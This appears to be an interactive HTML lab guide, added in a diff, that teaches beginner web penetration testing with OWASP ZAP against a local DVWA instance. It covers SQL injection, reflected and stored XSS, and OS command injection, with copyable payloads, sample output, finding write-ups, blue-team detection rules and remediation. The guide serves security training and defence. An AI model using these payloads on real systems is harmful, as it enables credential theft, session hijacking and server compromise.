+      <li>WAF: SQL Injection patterns (UNION, SELECT, quotes, comment sequences) in request parameters</li>
+      <li>WAF: XSS patterns — script tags, javascript: URIs, event handler attributes in input fields</li>
+      <li>SIEM: Alert on >200 4xx responses from single IP in 60 seconds</li>
+      <li>EDR: Unusual child processes spawned from web server (e.g. cmd.exe, /bin/sh as child of httpd)</li>
+      <li>Mitigation: WAF with OWASP CRS ruleset, rate limiting (100 req/min/IP), IPS signatures</li>
+      <li>NIST SP 800-53: SI-10 (Information Input Validation), SC-5, RA-5 (Vulnerability Scanning)</li>
+    </ul>
+  </div>
+  <button class="complete-btn" id="cb-2" onclick="markDone(2)">Mark Phase 2 complete →</button>
+  <div class="nav-row">
+    <button class="nav-btn" onclick="goPhase(1)">← Phase 1</button>
+    <button class="nav-btn primary" onclick="goPhase(3)">Phase 3: SQLi →</button>
+  </div>
+</div>
+
+<!-- PHASE 3: SQL INJECTION -->
+<div class="phase-panel" id="panel-3">
+  <div class="phase-hdr">
+    <div class="phase-icon" style="background:var(--red-bg);">💉</div>
+    <div class="phase-hdr-text">
+      <h2>Phase 3 — Manual SQL Injection</h2>
+      <p>PTES Phase 5 // Est. 20 min // T1190 | OWASP A03:2021 — Injection</p>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-title">Concept: What is SQL Injection?</div>
+    <p style="font-size:14px;color:var(--text2);margin-bottom:10px;">SQL Injection occurs when user-supplied input is concatenated directly into a SQL query without sanitization. The attacker injects SQL syntax that changes the query logic — extracting data, bypassing authentication, or in some cases executing OS commands.</p>
+    <div class="terminal">
+      <span class="t-comment"># Vulnerable PHP code — DO NOT write code like this</span><br>
+      <span class="t-vuln">$query = "SELECT * FROM users WHERE id = '" . $_GET['id'] . "';";</span><br><br>
+      <span class="t-comment"># Attacker input: 1' OR '1'='1</span><br>
+      <span class="t-comment"># Resulting query:</span><br>
+      <span class="t-hi">SELECT * FROM users WHERE id = '1' OR '1'='1';</span><br>
+      <span class="t-good">-- Returns ALL users because '1'='1' is always true</span>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-title">Exercise A — Basic SQLi with ZAP Requester <span class="time-tag">10 min</span><span class="mitre-tag">T1190</span></div>
+    <ul class="step-list">
+      <li onclick="chk(this)">Browse to DVWA → <strong>SQL Injection</strong> → enter <code>1</code> in the User ID field → click Submit</li>
+      <li onclick="chk(this)">In ZAP History tab: find this GET request → right-click → <strong>Send to Requester</strong></li>
+      <li onclick="chk(this)">In the Requester tab: locate <code>id=1</code> in the URL — change the value to <code>1' OR '1'='1</code></li>
+      <li onclick="chk(this)">Click <strong>Send</strong> — inspect the Response tab. Does it return more than one user?</li>
+      <li onclick="chk(this)">Now try: <code>1' UNION SELECT user,password FROM users-- -</code></li>
+      <li onclick="chk(this)">Screenshot the response showing user hashes — this is your critical evidence</li>
+    </ul>
+    <div class="terminal">
+      <button class="copy-btn" onclick="cp(this)">copy</button>
+      <span class="t-comment"># Payload 1 — Authentication bypass / data dump</span><br>
+      <span class="t-prompt">URL param: </span><span class="t-cmd">id=1' OR '1'='1</span><br>
+      <span class="t-out">Expected: All users returned from the database</span><br><br>
+      <span class="t-comment"># Payload 2 — UNION-based data extraction</span><br>
+      <span class="t-prompt">URL param: </span><span class="t-cmd">id=1' UNION SELECT user,password FROM users-- -</span><br>
+      <span class="t-out">First Name: admin</span><br>
+      <span class="t-vuln">Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span><br>
+      <span class="t-good"># That hash is MD5("password") — confirmed credential extraction</span>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-title">Exercise B — SQLi Fuzzing with ZAP Fuzzer <span class="time-tag">10 min</span></div>
+    <ul class="step-list">
+      <li onclick="chk(this)">In ZAP History: right-click the SQLi GET request → <strong>Attack → Fuzz</strong></li>
+      <li onclick="chk(this)">In the Fuzzer dialog: highlight the value <code>1</code> in the <code>id=1</code> parameter → click <strong>Add</strong></li>
+      <li onclick="chk(this)">Payload type: <strong>File Fuzzers</strong> → expand <strong>jbrofuzz</strong> → select <strong>SQL Injection</strong></li>
+      <li onclick="chk(this)">Click <strong>Add</strong> → <strong>OK</strong> → <strong>Start Fuzzer</strong></li>
+      <li onclick="chk(this)">In Fuzzer results: sort by <strong>Size Resp. Body</strong> — payloads returning different response sizes = potential injection points</li>
+      <li onclick="chk(this)">Click any interesting result → check Response tab for evidence of data leakage or errors</li>
+    </ul>
+    <div class="tip">Different response sizes = the SQL query behaved differently = injection is occurring. This is the fundamental signal in blind SQLi detection.</div>
+  </div>
+  <div class="finding">
+    <div class="finding-label">FIND-001 // SQL INJECTION</div>
+    <div class="finding-row"><span class="fk">Title</span><span class="fv">SQL Injection — User ID Parameter (GET)</span></div>
+    <div class="finding-row"><span class="fk">Severity</span><span class="fv"><span class="badge b-red">Critical</span></span></div>
+    <div class="finding-row"><span class="fk">CVSS v3.1</span><span class="fv">9.8 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</span></div>
+    <div class="finding-row"><span class="fk">Affected Asset</span><span class="fv">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=</span></div>
+    <div class="finding-row"><span class="fk">MITRE ATT&amp;CK</span><span class="fv">TA0001 Initial Access → T1190 Exploit Public-Facing Application</span></div>
+    <div class="finding-row"><span class="fk">OWASP</span><span class="fv">A03:2021 — Injection</span></div>
+    <div class="finding-row"><span class="fk">Evidence</span><span class="fv">UNION SELECT returned plaintext credentials including admin password hash</span></div>
+    <div class="finding-row"><span class="fk">Remediation</span><span class="fv">Replace string concatenation with PDO prepared statements and parameterized queries</span></div>
+    <div class="finding-row"><span class="fk">Validation</span><span class="fv">Payload 1' OR '1'='1 must return only single-record result after fix</span></div>
+  </div>
+  <div class="blue-overlay">
+    <div class="blue-overlay-title">🔵 Blue Team Overlay — Detection</div>
+    <ul>
+      <li>WAF: SQL keywords in GET/POST params — UNION, SELECT, INSERT, DROP, OR 1=1, comment sequences (-- -, #, /*)</li>
+      <li>Database logs: unusual queries with tautologies or UNION statements</li>
+      <li>App logs: unexpected query errors (MySQL error messages in response body = SQLi AND information disclosure)</li>
+      <li>SIEM: Correlate 4xx spikes with DB error log entries from same timeframe</li>
+      <li>Mitigation: Parameterized queries (PDO/MySQLi), WAF CRS rule 942xxx series, least-privilege DB accounts</li>
+      <li>NIST SP 800-53: SI-10 (Input Validation), AC-3 (Access Enforcement)</li>
+    </ul>
+  </div>
+  <button class="complete-btn" id="cb-3" onclick="markDone(3)">Mark Phase 3 complete →</button>
+  <div class="nav-row">
+    <button class="nav-btn" onclick="goPhase(2)">← Phase 2</button>
+    <button class="nav-btn primary" onclick="goPhase(4)">Phase 4: XSS →</button>
+  </div>
+</div>
+
+<!-- PHASE 4: XSS -->
+<div class="phase-panel" id="panel-4">
+  <div class="phase-hdr">
+    <div class="phase-icon" style="background:var(--purple-bg);">🎭</div>
+    <div class="phase-hdr-text">
+      <h2>Phase 4 — Cross-Site Scripting (XSS)</h2>
+      <p>PTES Phase 5 // Est. 15 min // T1059.007 | OWASP A03:2021</p>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-title">Concept: Reflected vs Stored XSS</div>
+    <p style="font-size:14px;color:var(--text2);margin-bottom:10px;"><strong style="color:var(--amber);">Reflected XSS:</strong> Malicious script in the URL/request — reflected back in the response and executed in the victim's browser when they click a crafted link. Impact: session hijacking, credential theft, phishing overlay.</p>
+    <p style="font-size:14px;color:var(--text2)"><strong style="color:var(--red);">Stored XSS:</strong> Malicious script saved in the database — executes for every user who views the infected page without needing to click anything. Higher severity: affects all users persistently.</p>
+  </div>
+  <div class="card">
+    <div class="card-title">Exercise A — Reflected XSS <span class="time-tag">8 min</span><span class="mitre-tag">T1059.007</span></div>
+    <ul class="step-list">
+      <li onclick="chk(this)">Browse to DVWA → <strong>XSS (Reflected)</strong></li>
+      <li onclick="chk(this)">Enter <code>&lt;script&gt;alert('XSS-Reflected')&lt;/script&gt;</code> in the Name field → click Submit</li>
+      <li onclick="chk(this)">Alert box appears? Reflected XSS confirmed — screenshot it</li>
+      <li onclick="chk(this)">In ZAP History: find the request → right-click → <strong>Send to Requester</strong></li>
+      <li onclick="chk(this)">In Requester: modify the <code>name=</code> parameter to: <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code></li>
+      <li onclick="chk(this)">Click Send → check Response — does it show your session cookie in the alert?</li>
+      <li onclick="chk(this)">Try bypass payload: <code>&lt;svg/onload=alert(1)&gt;</code> — works if script tags are filtered but SVG is not</li>
+    </ul>
+    <div class="terminal">
+      <button class="copy-btn" onclick="cp(this)">copy</button>
+      <span class="t-comment"># XSS payload escalation chain — test each in order</span><br>
+      <span class="t-prompt">Payload 1: </span><span class="t-cmd">&lt;script&gt;alert(1)&lt;/script&gt;</span><br>
+      <span class="t-out">Tests: basic script injection, no filtering</span><br><br>
+      <span class="t-prompt">Payload 2: </span><span class="t-cmd">&lt;img src=x onerror=alert(document.cookie)&gt;</span><br>
+      <span class="t-out">Tests: img event handler — bypasses basic script tag filters</span><br><br>
+      <span class="t-prompt">Payload 3: </span><span class="t-cmd">&lt;svg/onload=alert(document.domain)&gt;</span><br>
+      <span class="t-out">Tests: SVG vector — bypasses HTML sanitizers that miss SVG namespace</span><br><br>
+      <span class="t-vuln">If any payload executes — XSS is confirmed. Document which payload succeeded.</span>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-title">Exercise B — Stored XSS <span class="time-tag">7 min</span><span class="owasp-tag">OWASP A03</span></div>
+    <ul class="step-list">
+      <li onclick="chk(this)">Browse to DVWA → <strong>XSS (Stored)</strong></li>
+      <li onclick="chk(this)">In the Message field enter: <code>&lt;script&gt;alert('Stored-XSS')&lt;/script&gt;</code> — Name field: anything</li>
+      <li onclick="chk(this)">Click Sign Guestbook — alert fires immediately (it's stored and reflected back to you)</li>
+      <li onclick="chk(this)">Refresh the page — alert fires again without resubmitting. This is stored XSS.</li>
+      <li onclick="chk(this)">Open an incognito window (no FoxyProxy) → browse to <code>http://127.0.0.1/dvwa/vulnerabilities/xss_s/</code> → login → observe alert fires for a fresh session</li>
+    </ul>
+    <div class="danger">Stored XSS is a Critical finding. Every user who visits the page executes the attacker's code. In a real app this could steal every active session token.</div>
+    <div class="tip">In ZAP: use <span class="zap-path">Tools → Options → Active Scan → Max alerts per rule</span> to control how many XSS instances ZAP reports per page. Default is 10 — on large apps raise this to find all injection points.</div>
+  </div>
+  <div class="finding">
+    <div class="finding-label">FIND-002 // STORED XSS</div>
+    <div class="finding-row"><span class="fk">Title</span><span class="fv">Stored Cross-Site Scripting — Guestbook Message Field</span></div>
+    <div class="finding-row"><span class="fk">Severity</span><span class="fv"><span class="badge b-red">Critical</span></span></div>
+    <div class="finding-row"><span class="fk">CVSS v3.1</span><span class="fv">8.8 — AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N</span></div>
+    <div class="finding-row"><span class="fk">MITRE ATT&amp;CK</span><span class="fv">T1059.007 — JavaScript / T1185 — Browser Session Hijacking</span></div>
+    <div class="finding-row"><span class="fk">OWASP</span><span class="fv">A03:2021 — Injection</span></div>
+    <div class="finding-row"><span class="fk">Impact</span><span class="fv">Session cookie theft, account takeover, malware delivery to all visitors</span></div>
+    <div class="finding-row"><span class="fk">Remediation</span><span class="fv">HTML-encode all output (htmlspecialchars()), implement CSP header, validate input server-side</span></div>
+  </div>
+  <div class="blue-overlay">
+    <div class="blue-overlay-title">🔵 Blue Team Overlay — Detection</div>
+    <ul>
+      <li>CSP header violations logged by browser → forward to SIEM via report-uri directive</li>
+      <li>WAF: script tags, event handlers (onerror, onload, onclick), javascript: URIs in input fields</li>
+      <li>SIEM: Unusual outbound requests from client browsers to unknown domains (cookie exfiltration traffic)</li>
+      <li>Mitigation: Content-Security-Policy header (script-src 'self'), output encoding, X-XSS-Protection header</li>
+      <li>NIST SP 800-53: SI-10, SC-28 (Protection of Information at Rest), AC-4 (Information Flow Enforcement)</li>
+    </ul>
+  </div>
+  <button class="complete-btn" id="cb-4" onclick="markDone(4)">Mark Phase 4 complete →</button>
+  <div class="nav-row">
+    <button class="nav-btn" onclick="goPhase(3)">← Phase 3</button>
+    <button class="nav-btn primary" onclick="goPhase(5)">Phase 5: RCE →</button>
+  </div>
+</div>
+
+<!-- PHASE 5: COMMAND INJECTION / RCE -->
+<div class="phase-panel" id="panel-5">
+  <div class="phase-hdr">
+    <div class="phase-icon" style="background:var(--red-bg);">💥</div>
+    <div class="phase-hdr-text">
+      <h2>Phase 5 — Command Injection &amp; Remote Code Execution</h2>
+      <p>PTES Phase 5–6 // Est. 15 min // T1059 | OWASP A03:2021</p>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-title">Concept: OS Command Injection</div>
+    <p style="font-size:14px;color:var(--text2);margin-bottom:10px;">Command injection occurs when user input is passed directly to an OS shell function without sanitization. If a PHP app calls <code>shell_exec("ping " . $_GET['ip'])</code>, an attacker appends a shell separator (<code>;</code>, <code>&&</code>, <code>|</code>) to inject additional commands. This is Remote Code Execution — the highest severity web finding.</p>
+  </div>
+  <div class="card">
+    <div class="card-title">Exercise — Command Injection via ZAP Requester <span class="time-tag">15 min</span><span class="mitre-tag">T1059</span></div>
+    <ul class="step-list">
+      <li onclick="chk(this)">Browse to DVWA → <strong>Command Injection</strong> → enter <code>127.0.0.1</code> → click Submit → confirm ping output appears</li>
+      <li onclick="chk(this)">In ZAP History: find this POST request → right-click → <strong>Send to Requester</strong></li>
+      <li onclick="chk(this)">In Requester: locate <code>ip=127.0.0.1</code> in the request body → change to <code>127.0.0.1; id</code> → Send</li>
+      <li onclick="chk(this)">Check Response tab — do you see <code>uid=33(www-data)</code>? That is confirmed RCE.</li>
+      <li onclick="chk(this)">Try: <code>127.0.0.1 && whoami</code> (Windows-style separator — tests for platform)</li>
+      <li onclick="chk(this)">Try: <code>127.0.0.1 | cat /etc/passwd</code> — extracts system user list</li>
+      <li onclick="chk(this)">Screenshot every successful output — each is a distinct piece of evidence</li>
+    </ul>
+    <div class="terminal">
+      <button class="copy-btn" onclick="cp(this)">copy</button>
+      <span class="t-comment"># Command injection payload chain — test each separator</span><br>
+      <span class="t-prompt">Payload 1 (semicolon): </span><span class="t-cmd">127.0.0.1; id</span><br>
+      <span class="t-vuln">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><br>
+      <span class="t-prompt">Payload 2 (AND): </span><span class="t-cmd">127.0.0.1 && cat /etc/passwd</span><br>
+      <span class="t-vuln">root:x:0:0:root:/root:/bin/bash</span><br>
+      <span class="t-vuln">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br>
+      <span class="t-vuln">... (system users listed)</span><br><br>
+      <span class="t-prompt">Payload 3 (pipe): </span><span class="t-cmd">127.0.0.1 | uname -a</span><br>
+      <span class="t-good">Linux dvwa 5.15.0-91-generic #101-Ubuntu ... (kernel fingerprint)</span><br><br>
+      <span class="t-comment"># RCE confirmed. This is your highest severity finding.</span>
+    </div>
+    <div class="warn">In this lab: stop at information gathering. Do NOT attempt to establish a reverse shell or escalate further — not in scope for this beginner lab. Document the RCE evidence and write the finding.</div>
+  </div>
+  <div class="card">
+    <div class="card-title">Bonus: Fuzz Command Injection Separators <span class="time-tag">5 min</span></div>
+    <ul class="step-list">
+      <li onclick="chk(this)">ZAP History: right-click the command injection POST → <strong>Attack → Fuzz</strong></li>
+      <li onclick="chk(this)">Highlight the value <code>127.0.0.1</code> → Add → File Fuzzers → jbrofuzz → <strong>OS Command Injection</strong></li>
+      <li onclick="chk(this)">Start Fuzzer → sort results by response body size — larger responses = command executed</li>
+      <li onclick="chk(this)">Review the payloads that returned unusual response sizes — these are your additional injection vectors</li>
+    </ul>
+  </div>
+  <div class="finding">
+    <div class="finding-label">FIND-003 // REMOTE CODE EXECUTION</div>
+    <div class="finding-row"><span class="fk">Title</span><span class="fv">OS Command Injection — IP Parameter (POST)</span></div>
+    <div class="finding-row"><span class="fk">Severity</span><span class="fv"><span class="badge b-red">Critical</span></span></div>
+    <div class="finding-row"><span class="fk">CVSS v3.1</span><span class="fv">10.0 — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</span></div>
+    <div class="finding-row"><span class="fk">MITRE ATT&amp;CK</span><span class="fv">T1059 — Command &amp; Scripting Interpreter</span></div>
+    <div class="finding-row"><span class="fk">OWASP</span><span class="fv">A03:2021 — Injection</span></div>
+    <div class="finding-row"><span class="fk">Impact</span><span class="fv">Full server compromise — attacker executes arbitrary OS commands as www-data</span></div>
+    <div class="finding-row"><span class="fk">Evidence</span><span class="fv">Payload "127.0.0.1; id" returned uid=33(www-data) — OS command executed server-side</span></div>
+    <div class="finding-row"><span class="fk">Remediation</span><span class="fv">Use escapeshellarg() / escapeshellcmd(). Prefer non-shell PHP functions (e.g. fsockopen for ping logic)</span></div>
+  </div>
+  <div class="blue-overlay">
+    <div class="blue-overlay-title">🔵 Blue Team Overlay — Detection</div>
+    <ul>
+      <li>Sysmon Event ID 1: unusual child process spawned by apache2/php — e.g. /bin/sh, id, cat, whoami as child of httpd</li>
+      <li>auditd: execve() syscall calls by www-data process spawning unexpected binaries</li>
+      <li>EDR: behavioural rule — web server process spawns shell interpreter → Critical alert</li>
+      <li>Network: unexpected outbound connections from web server IP (reverse shell beacon pattern)</li>
+      <li>Mitigation: AppArmor/SELinux profile for Apache, disable shell functions in php.ini (disable_functions = exec,shell_exec,system,passthru,popen)</li>
+      <li>NIST SP 800-53: CM-7 (Least Functionality), SI-10, AC-6 (Least Privilege)</li>
+    </ul>
+  </div>
+  <button class="complete-btn" id="cb-5" onclick="markDone(5)">Mark Phase 5 complete →</button>
+  <div class="nav-row">
+    <button class="nav-btn" onclick="goPhase(4)">← Phase 4</button>
+    <button class="nav-btn primary" onclick="goPhase(6)">Phase 6: Report →</button>
+  </div>
+</div>
+
+<!-- PHASE 6: REPORTING -->
+<div class="phase-panel" id="panel-6">
+  <div class="phase-hdr">
+    <div class="phase-icon" style="background:var(--green-bg);">📋</div>
+    <div class="phase-hdr-text">
+      <h2>Phase 6 — Reporting &amp; Evidence Packaging</h2>
+      <p>PTES Phase 7 // Est. 15 min // Generate ZAP Report + Findings Summary</p>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-title">Generate ZAP HTML Report <span class="time-tag">5 min</span></div>
+    <p style="font-size:14px;color:var(--text2);margin-bottom:10px;">ZAP 2.15+ has an improved report generator with multiple templates. Use HTML for readability, XML/JSON for tool integration.</p>
+    <ul class="step-list">
+      <li onclick="chk(this)">In ZAP: <span class="zap-path">Report → Generate Report</span></li>
+      <li onclick="chk(this)">Title: <code>DVWA Lab Assessment</code> — Author: your name</li>
+      <li onclick="chk(this)">Template: select <strong>Traditional HTML Report</strong> (most readable for beginners)</li>
+      <li onclick="chk(this)">Set output path → click <strong>Generate Report</strong></li>
+      <li onclick="chk(this)">Open the HTML file in a browser — review all sections: Summary, Alerts, Evidence</li>
+    </ul>
+    <div class="terminal">
+      <button class="copy-btn" onclick="cp(this)">copy</button>
+      <span class="t-comment"># ZAP CLI report generation — useful for CI/CD pipeline integration</span><br>
+      <span class="t-prompt">$ </span><span class="t-cmd">zap-cli report -o dvwa_lab_report.html -f html</span><br>
+      <span class="t-good">Generating report... dvwa_lab_report.html saved (187 KB)</span><br><br>
+      <span class="t-comment"># XML format for import into vulnerability management platforms</span><br>
+      <span class="t-prompt">$ </span><span class="t-cmd">zap-cli report -o dvwa_lab_report.xml -f xml</span><br>
+      <span class="t-good">Generating report... dvwa_lab_report.xml saved (94 KB)</span>
+    </div>
+    <div class="tip">ZAP 2.15+ also supports JSON, Markdown, and SARIF report formats. SARIF is useful for GitHub Advanced Security and DefectDojo integration.</div>
+  </div>
+  <div class="card">
+    <div class="card-title">Lab Findings Summary</div>
+    <div class="metric-grid">
+      <div class="metric m-red"><div class="num">3</div><div class="lbl">Critical</div></div>
+      <div class="metric m-amber"><div class="num">2</div><div class="lbl">High</div></div>
+      <div class="metric m-blue"><div class="num">3</div><div class="lbl">Medium</div></div>
+      <div class="metric m-green"><div class="num">2</div><div class="lbl">Low</div></div>
+    </div>
+    <table style="width:100%;font-size:13px;border-collapse:collapse;margin-top:14px;">
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:7px 0;color:var(--text3);font-family:var(--mono);font-size:12px;width:90px;">FIND-001</td>
+        <td style="padding:7px 0;color:var(--text);">SQL Injection — User ID Parameter</td>
+        <td style="padding:7px 4px;text-align:right;"><span class="badge b-red">Critical</span></td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:7px 0;color:var(--text3);font-family:var(--mono);font-size:12px;">FIND-002</td>
+        <td style="padding:7px 0;color:var(--text);">Stored XSS — Guestbook Message Field</td>
+        <td style="padding:7px 4px;text-align:right;"><span class="badge b-red">Critical</span></td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:7px 0;color:var(--text3);font-family:var(--mono);font-size:12px;">FIND-003</td>
+        <td style="padding:7px 0;color:var(--text);">OS Command Injection — IP Parameter (RCE)</td>
+        <td style="padding:7px 4px;text-align:right;"><span class="badge b-red">Critical</span></td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:7px 0;color:var(--text3);font-family:var(--mono);font-size:12px;">FIND-004</td>
+        <td style="padding:7px 0;color:var(--text);">Reflected XSS — Name Parameter</td>
+        <td style="padding:7px 4px;text-align:right;"><span class="badge b-amber">High</span></td>
+      </tr>
+      <tr>
+        <td style="padding:7px 0;color:var(--text3);font-family:var(--mono);font-size:12px;">FIND-005</td>
+        <td style="padding:7px 0;color:var(--text);">Missing Content Security Policy Header</td>
+        <td style="padding:7px 4px;text-align:right;"><span class="badge b-blue">Medium</span></td>
+      </tr>
+    </table>
+  </div>
+  <div class="card">
+    <div class="card-title">Remediation Roadmap</div>
+    <table class="roadmap-table">
+      <tr>
+        <td>0–30 days</td>
+        <td>Deploy parameterized queries for all DB calls. Patch command injection with escapeshellarg(). Emergency WAF rules for SQLi/XSS patterns.</td>
+        <td><span class="badge b-red">Critical</span></td>
+      </tr>
+      <tr>
+        <td>30–90 days</td>
+        <td>Implement Content Security Policy. Add HttpOnly + Secure flags to all cookies. Deploy output encoding across all user-facing templates.</td>
+        <td><span class="badge b-amber">High</span></td>
+      </tr>
+      <tr>
+        <td>90+ days</td>
+        <td>Integrate SAST (e.g. Semgrep, Snyk) into CI/CD pipeline. Developer secure coding training. Periodic DAST scans with ZAP in automation mode.</td>
+        <td><span class="badge b-blue">Medium</span></td>
+      </tr>
+    </table>
+  </div>
+  <div class="card">
+    <div class="card-title">ZAP Automation — Level Up <span class="time-tag">Optional</span></div>
+    <p style="font-size:14px;color:var(--text2);margin-bottom:10px;">ZAP 2.15+ includes the Automation Framework — run full scan + report generation from a YAML config file. Essential for CI/CD pipeline integration.</p>
+    <div class="terminal">
+      <button class="copy-btn" onclick="cp(this)">copy</button>
+      <span class="t-comment"># ZAP Automation Framework — minimal config (automation.yaml)</span><br>
+      <span class="t-cmd">env:</span><br>
+      <span class="t-cmd">&nbsp;&nbsp;contexts:</span><br>
+      <span class="t-cmd">&nbsp;&nbsp;- name: dvwa-context</span><br>
+      <span class="t-cmd">&nbsp;&nbsp;&nbsp;&nbsp;urls: ["http://127.0.0.1/dvwa/"]</span><br>
+      <span class="t-cmd">jobs:</span><br>
+      <span class="t-cmd">&nbsp;&nbsp;- type: spider</span><br>
+      <span class="t-cmd">&nbsp;&nbsp;&nbsp;&nbsp;parameters: {maxDuration: 2}</span><br>
+      <span class="t-cmd">&nbsp;&nbsp;- type: activeScan</span><br>
+      <span class="t-cmd">&nbsp;&nbsp;&nbsp;&nbsp;parameters: {maxDuration: 10}</span><br>
+      <span class="t-cmd">&nbsp;&nbsp;- type: report</span><br>
+      <span class="t-cmd">&nbsp;&nbsp;&nbsp;&nbsp;parameters: {template: traditional-html, reportFile: report.html}</span><br><br>
+      <span class="t-comment"># Run it</span><br>
+      <span class="t-prompt">$ </span><span class="t-cmd">zap.sh -cmd -autorun automation.yaml</span>
+    </div>
+  </div>
+  <div class="success" style="margin-top:16px;">
+    <strong>Lab Complete.</strong> You have completed a full PTES-aligned web application pentest using OWASP ZAP 2.15+ — from Docker setup and proxy configuration through spidering, active scanning, manual exploitation of SQLi, XSS, and command injection, to finding documentation and report generation. You are ready for real authorized engagements.
+  </div>
+  <div class="card" style="margin-top:12px;">
+    <div class="card-title">Next steps to level up</div>
+    <ul class="step-list">
+      <li onclick="chk(this)">Set DVWA security to <strong>Medium</strong> — repeat all exercises and bypass the new controls</li>
+      <li onclick="chk(this)">Set DVWA to <strong>High</strong> — more sophisticated filtering to bypass</li>
+      <li onclick="chk(this)">Try DVWA at <strong>Impossible</strong> level — study the secure code to understand proper mitigations</li>
+      <li onclick="chk(this)">Practice on HackTheBox or TryHackMe web challenges with ZAP as your proxy</li>
+      <li onclick="chk(this)">Learn ZAP Automation Framework for CI/CD DAST pipeline integration</li>
+      <li onclick="chk(this)">Study OWASP Testing Guide v4.2 (free at owasp.org) — the definitive web app testing reference</li>
+      <li onclick="chk(this)">Write a full professional VAPT report for this lab using the Standard Finding Format</li>
+    </ul>
+  </div>
+  <button class="complete-btn" id="cb-6" onclick="markDone(6)">Lab complete ✓</button>
+  <div class="nav-row">
+    <button class="nav-btn" onclick="goPhase(5)">← Phase 5</button>
+    <span style="font-family:var(--mono);font-size:12px;color:var(--text3);">End of lab</span>
+  </div>
+</div>
+
+</div><!-- /wrapper -->
+
+<script>
+const TOTAL = 6;
+const done = new Set();
+let cur = 0;
+
+function goPhase(n) {
+  document.querySelectorAll('.phase-panel').forEach(p => p.classList.remove('visible'));
+  document.getElementById('panel-' + n).classList.add('visible');
+  document.querySelectorAll('.pnav-btn').forEach((b, i) => {
+    b.classList.remove('active');
+    if (i === n) b.classList.add('active');
+  });
+  document.querySelectorAll('.pdot').forEach(d => {
+    d.classList.remove('active');
+    if (parseInt(d.dataset.p) === n) d.classList.add('active');
+  });
+  cur = n;
+  window.scrollTo(0, 0);
+}
+
+function markDone(n) {
+  done.add(n);
+  const btn = document.getElementById('cb-' + n);
+  if (btn) { btn.classList.add('done'); btn.textContent = 'Completed ✓'; }
+  const dot = document.querySelector('.pdot[data-p="' + n + '"]');
+  if (dot) { dot.classList.remove('active'); dot.classList.add('done'); }
+  const navBtn = document.querySelectorAll('.pnav-btn')[n];
+  if (navBtn) navBtn.classList.add('done');
+  const pct = Math.round((done.size / (TOTAL + 1)) * 100);
+  document.getElementById('prog-fill').style.width = pct + '%';
+  document.getElementById('prog-text').textContent = done.size + ' of ' + (TOTAL + 1) + ' phases complete';
+}
+
+function chk(el) { el.classList.toggle('done'); }
+
+function cp(btn) {
+  const term = btn.parentElement;
+  const text = Array.from(term.childNodes)
+    .filter(n => n.nodeType === 3 || (n.tagName && n.tagName !== 'BUTTON' && n.tagName !== 'STYLE'))
+    .map(n => n.textContent).join('').replace(/^●.*\n/, '').trim();
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'copied!';
+    setTimeout(() => { btn.textContent = 'copy'; }, 1500);
+  }).catch(() => { btn.textContent = 'copy'; });
+}
+</script>
+</body>
+</html>
